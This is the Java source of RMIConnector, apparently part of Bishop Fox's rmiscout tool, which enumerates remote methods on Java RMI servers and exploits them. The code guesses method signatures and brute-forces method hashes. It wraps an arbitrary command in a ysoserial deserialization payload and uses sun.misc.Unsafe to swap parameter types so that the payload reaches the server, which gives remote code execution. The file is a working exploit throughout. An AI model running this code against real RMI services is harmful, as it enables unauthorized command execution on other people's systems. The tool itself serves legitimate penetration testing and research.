package com.bishopfox.rmiscout;

import javassist.*;
import javassist.bytecode.DuplicateMemberException;
import sun.misc.Unsafe;
import ysoserial.payloads.ObjectPayload;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.RemoteStub;
import java.security.SecureRandom;
import java.util.*;

@SuppressWarnings({"deprecation", "unchecked"})
public class RMIConnector {
    private Registry registry;
    private Map<String, Remote> remoteRefs;
    private Loader customClassLoader;
    private ClassLoader originalClassLoader;
    private boolean allowUnsafe;
    private Class dummyClass;
    private static final int parameterTypesOffset = 52;
    private boolean isActivationServer;


    private static class Colors {
        public static String GREEN = "\033[92m";
        public static String RED = "\033[91m";
        public static String ENDC = "\033[0m";

    }

    private void generateDummyClass(ClassPool pool) {
        SecureRandom random = new SecureRandom();
        byte bytes[] = new byte[256];
        random.nextBytes(bytes);
        Base64.Encoder encoder = Base64.getUrlEncoder().withoutPadding();
        String clsname = encoder.encodeToString(bytes).substring(0,254).replace("-","_");
        try {
            CtClass ctclass = pool.makeClass(clsname);
            ctclass.setInterfaces(new CtClass[]{pool.get("java.io.Serializable")});
            dummyClass = ctclass.toClass();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (NotFoundException e) {
            e.printStackTrace();
        }
    }



    @SuppressWarnings("unchecked")
    public RMIConnector(String host, int port, String remoteName, List<String> signatures, boolean allowUnsafe, boolean isActivationServer) {
        try {
            this.allowUnsafe = allowUnsafe;
            this.isActivationServer = isActivationServer;
            String[] regNames = null;

            try {
                // Attempt a standard cleartext connection
                this.registry = LocateRegistry.getRegistry(host, port);
                regNames = registry.list();
            } catch (ConnectIOException ce) {
                // Fallback to an insecure (all-trust) SSL Connection
                this.registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
                regNames = registry.list();
            }


            this.remoteRefs = new HashMap<>();

            // Switch to custom classloader
            ClassPool defaultClassPool = ClassPool.getDefault();
            defaultClassPool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
            this.customClassLoader = new Loader(Thread.currentThread().getContextClassLoader(), defaultClassPool);
            customClassLoader.delegateLoadingOf("jdk.internal.misc.Unsafe"); // needed for Mockito#mock
            customClassLoader.delegateLoadingOf("jdk.internal.reflect.MethodAccessorImpl"); // needed for Mockito#mock
            customClassLoader.delegateLoadingOf("jdk.internal.reflect.SerializationConstructorAccessorImpl"); // needed for Mockito#mock & Junit4#Result

            generateDummyClass(defaultClassPool);
            CtClass remoteInterface = defaultClassPool.getCtClass(Remote.class.getName());

            // If remoteName is not specificied create a list of all remotes
            if (remoteName != null) {
                regNames = new String[]{remoteName};
            }

            // For each registry create interface bound with test methods
            for (String regName : regNames) {

                // Get remote interface name from exception
                String interfaceName = "";
                try {
                    registry.lookup(regName);
                } catch (UnmarshalException e) {
                    if (e.detail instanceof ClassNotFoundException) {
                        interfaceName = e.detail.getMessage().split(" ")[0];
                    } else {
                        System.err.println(Colors.RED + "[ERROR] Error retrieving remote interface className for name '" + regName + "'" + Colors.ENDC);
                        System.exit(1);
                    }
                } catch (NotBoundException e) {
                    System.err.println(Colors.RED + "[ERROR] Registry not bound on remote server: '" + regName + "'" + Colors.ENDC);
                    System.exit(1);
                }

                String stubName = "DefaultStub";
                if (isActivationServer) {
                    if (!interfaceName.isEmpty()) {
                        stubName = interfaceName;
                    }
                    interfaceName = "ActivationStub";
                }

                CtClass nInterface = defaultClassPool.makeInterface(interfaceName, remoteInterface);
                generateStubs(nInterface, signatures);

                if (isActivationServer) {
                    // Example ActivationStub
                    //
                    // All stubs have same hardcoded serialVersionUID = 2; https://bugs.openjdk.java.net/browse/JDK-4066716
                    //
                    // public class MyClass_Stub extends RemoteStub implements Remote
                    // {
                    //    private static final long serialVersionUID = 2L;
                    // }

                    CtClass activationStub = defaultClassPool.makeClass(stubName, defaultClassPool.getCtClass(RemoteStub.class.getName()));
                    activationStub.setInterfaces(new CtClass[]{nInterface});

                    CtField f = new CtField(CtPrimitiveType.longType, "serialVersionUID", activationStub);
                    f.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.FINAL);
                    activationStub.addField(f, CtField.Initializer.constant(2L));
                    activationStub.toClass(customClassLoader);
                }

                originalClassLoader = Thread.currentThread().getContextClassLoader();

                Thread.currentThread().setContextClassLoader(customClassLoader);

                this.remoteRefs.put(interfaceName, registry.lookup(regName));


            }

        } catch (RemoteException e) {
            if (e.getMessage().contains("class invalid for deserialization")) {
                System.err.println("RMI Activation Server detected. Re-run with --activation-server");
            } else {
                System.err.println(e.getMessage());
            }
            System.exit(1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void generateStubs(CtClass ctclass, List<String> signatures) {
        try {
            for (String sig : signatures) {
                checkAndCreateTypes(sig);

                // Simple method validation
                if (!sig.matches("[\\w()<>,\\.\\[\\]\\s]+")) {
                    System.err.println("[INFO] Skipping, Invalid syntax: " + sig);
                }

                boolean wasModified = false;

                // Check for dummy params
                if(sig.matches("^.*\\(\\w[^\\s]*\\).*")) {
                    System.out.println("[INFO] Adding missing dummy parameter names to signature");
                    sig = sig.replace(",", " a,");
                    sig = sig.replace(")", " a)");
                    wasModified = true;
                }

                if(sig.matches(".*\\.\\w+\\(.*")) {
                    System.out.println("[INFO] Removing method FQDN");
                    sig = sig.replaceFirst("[\\w\\.\\$]+\\.", "");
                    wasModified = true;
                }

                if (wasModified) {
                    System.out.println("[INFO] Auto-corrected signature: " + sig);
                }


                CtMethod newmethod = CtNewMethod.make(String.format("%s throws java.rmi.RemoteException;", sig), ctclass);

                // Skip void args because they will always be executed
                if (!allowUnsafe && newmethod.getParameterTypes().length == 0) {
                    System.out.println("[INFO] Skipping, void args: " + sig);
                    continue;
                }

                try {
                    ctclass.addMethod(newmethod);

                } catch (DuplicateMemberException e) {
                    System.out.println("[INFO] Duplicate prototype: " + newmethod);
                }
            }

            ctclass.toClass(customClassLoader);
        } catch (CannotCompileException ce ) {
            if (ce.getReason().contains(ctclass.getSimpleName())) {
                System.err.println("\n" + Colors.RED + "[ERROR] Did you forget to remove the interface name from the method name?\n\nFull Stacktrace:\n" + Colors.ENDC);
            }
            else if (ce.getReason().contains(",") || ce.getReason().contains(") ")) {
                System.err.println("\n" + Colors.RED + "[ERROR] Dummy parameter names are required for method signature (e.g., -s 'boolean login(java.lang.String a, java.lang.String b)') \n\nFull Stacktrace:\n" + Colors.ENDC);
            }
            else if (ce.getReason().contains("no such class")) {
                System.err.println("\n" + Colors.RED + "[ERROR] Please provide fully-qualified name for this class.\n\nFull Stacktrace:\n" + Colors.ENDC);
            }
            ce.printStackTrace();
            System.exit(1);
        } catch (NotFoundException e) {
            e.printStackTrace();
        }
    }


    public void checkAndCreateTypes(String sig) {
        ClassPool defaultClassPool = ClassPool.getDefault();

        // Split signature into tokens and look for unknown types to dynamically generate
        String[] parts = sig.split("\\(|\\)|,");

        for (String part : parts) {
            String type = part.trim().split(" ")[0];
            type = type.replace("[]","").replace("...","");
            try {
                // If appears to be fully-qualified name, check if it's in the classloader
                if (type.contains(".")) {
                    Class.forName(type);
                }
            } catch (ClassNotFoundException ce) {
                // Create an empty class if FQN doesn't exist
                CtClass ctClass = defaultClassPool.makeClass(type);
                try {
                    ctClass.toClass();
                } catch (CannotCompileException e) {
                    e.printStackTrace();
                }
            }
        }
    }
    private boolean checkExploitableParam() {
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            Method[] methods = null;

            String registryName = pair.getKey();
            Remote stub = pair.getValue();

            try {
                methods = customClassLoader.loadClass(registryName).getDeclaredMethods();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                break;
            }

            // Iterate over each method
            for (Method me : methods) {
                String methodSignature = me.toString();
                for (Class c : me.getParameterTypes()) {
                    if (c != java.lang.String.class) {
                        return true;
                    }
                }
            }
        }
        return false;
    }


    public void exploit(String payloadName, String command) {
        Class clz = null;
        Object payload = null;

        try {
            clz = Class.forName(payloadName);
            if (ObjectPayload.class.isAssignableFrom(clz)) {
                ObjectPayload<Object> obj = (ObjectPayload<Object>)clz.newInstance();
                payload = obj.getObject(command);
            } else {
                throw new IllegalArgumentException("Class does not implement ObjectPayload<Object>");
            }
        } catch (com.nqzero.permit.Permit.InitializationFailed e) {
            System.err.println(Colors.RED + "[ERROR] ysoserial dependency does not work with JRE > 1.8" + Colors.ENDC);
            System.exit(1);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }

        // Check for universally exploitable param (i.e., non-primitives other than java.lang.String)
        boolean exploitableParam = checkExploitableParam();

        // Try preserving strings during execution if first try fails
        if(!execute(payload, false) && !execute(payload, true)) {
            if (exploitableParam) {
                System.err.println(Colors.RED + "[ERROR] Payload was not invoked. Check the accuracy of the signature." + Colors.ENDC);
            } else {
                System.err.println(Colors.RED + "[ERROR] Server-side JRE (>=8u242-b07, >=11.0.6+10, >=13.0.2+5, >=14.0.1+2) can't be exploited by java.lang.String types" + Colors.ENDC);
            }
        } else {
            System.out.println("Executed");
        }
    }

    public void checkIfPresent() {
        try {
            execute(dummyClass.newInstance(), false);
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public boolean execute(Object payload, boolean preserveStrings) {
        if (preserveStrings) {
            System.out.println("[INFO] Re-running execute without overwriting java.lang.String types.");
        }
        // Iterate for each registry name
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            Method[] methods = null;

            String registryName = pair.getKey();
            Remote stub = pair.getValue();

            try {
                methods = customClassLoader.loadClass(registryName).getDeclaredMethods();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                break;
            }

            // Iterate over each method
            for (Method me : methods) {
                String methodSignature = me.toString();

                try {

                    // Load payload or dummy object into param slots
                    Object[] params = new Object[me.getParameterCount()];
                    if (!preserveStrings) {
                        Arrays.fill(params, payload);
                    } else {
                        int i = 0;
                        for (Class c : me.getParameterTypes()) {
                            if (c == java.lang.String.class) {
                                params[i] = "";
                            } else {
                                params[i] = payload;
                            }
                            i++;
                        }
                    }

                    // Create fake parameter types for payload
                    Class[] fakeParameterTypes = new Class[me.getParameterCount()];
                    if (!preserveStrings) {
                        Arrays.fill(fakeParameterTypes, payload.getClass());
                    } else {
                        int i = 0;
                        for (Class c : me.getParameterTypes()) {
                            if (c == java.lang.String.class) {
                                fakeParameterTypes[i] = java.lang.String.class;
                            } else {
                                fakeParameterTypes[i] = payload.getClass();
                            }
                            i++;
                        }
                    }
                    // Bypass internal call flow for custom params
                    RemoteRef ref = null;
                    if (this.isActivationServer) {
                        Field f = RemoteObject.class.getDeclaredField("ref");
                        f.setAccessible(true);
                        ref = (RemoteRef) f.get(stub);
                    } else {
                        Field f = Proxy.class.getDeclaredField("h");
                        f.setAccessible(true);
                        ref = ((RemoteObjectInvocationHandler) f.get(stub)).getRef();
                    }




                    // Calculate MethodHash
                    Method m = RemoteObjectInvocationHandler.class.getDeclaredMethod("getMethodHash", Method.class);
                    m.setAccessible(true);
                    long methodHash = (long)m.invoke(RemoteObjectInvocationHandler.class, me);

                    // Ensure type mismatch to trigger server error
                    // (jdk12+ compatible way to modify java.lang.Method)
                    Field u = Unsafe.class.getDeclaredField("theUnsafe");
                    u.setAccessible(true);
                    Unsafe unsafe = (Unsafe) u.get(null);

                    // Safety check and set
                    if (me.getParameterTypes()[0].equals(((Class<?>[])unsafe.getObject(me,parameterTypesOffset))[0])) {
                        unsafe.putObject(me, parameterTypesOffset, fakeParameterTypes);
                    } else {
                        System.err.println(Colors.RED + "[ERROR] JRE version not supported." + Colors.ENDC);
                        System.exit(-1);
                    }

                    // Invoke remote method
                    Object response = ref.invoke(stub, me, params, methodHash);

                    // This next line should only occur when allowUnsafe or when launching exploits
                    System.out.println("Executed Payload: " + methodSignature);
                    System.out.println("\tResponse [" + response.getClass() + "] = " + response.toString());
                    return true;
                } catch (IllegalArgumentException e) {
                    if (e.getMessage().contains("argument type") || e.getMessage().contains("ClassCast")) {
                        System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                        return true;
                    } else {
                        e.printStackTrace();
                    }
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (ConnectException e) {
                    System.err.println(Colors.RED + "Failed to connect to remote" + Colors.ENDC);
                    System.exit(1);
                } catch (ServerException e) {
                    if(e.getCause().getCause() instanceof ClassNotFoundException) {
                        System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                    } else if(e.getCause() instanceof UnmarshalException) {
                        if (e.getCause().getMessage().contains("unrecognized method hash")) {
                        } else if (e.getCause().getMessage().contains("error unmarshalling arguments")) {
                            System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                        }
                    } else {
                        e.printStackTrace();
                    }
                } catch (ClassCastException e) {
                    System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                } catch (UnmarshalException e) {
                    // Pass
                } catch (Exception e) {
                    e.printStackTrace();
                } catch (Throwable throwable) {
                    // Pass
                }
            }

        }
        return false;
    }

    public void cleanup() {
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            String registryName = pair.getKey();
            ClassPool defaultClassPool = ClassPool.getDefault();

            try {
                CtClass ctClass = defaultClassPool.getCtClass(registryName);
                ctClass.detach();

                if (this.isActivationServer) {
                    defaultClassPool.getCtClass(pair.getValue().getClass().getName()).detach();
                }
            } catch (NotFoundException e) {
                e.printStackTrace();
            }
        }

        // Restore thread's previous classloader
        Thread.currentThread().setContextClassLoader(originalClassLoader);
    }

}
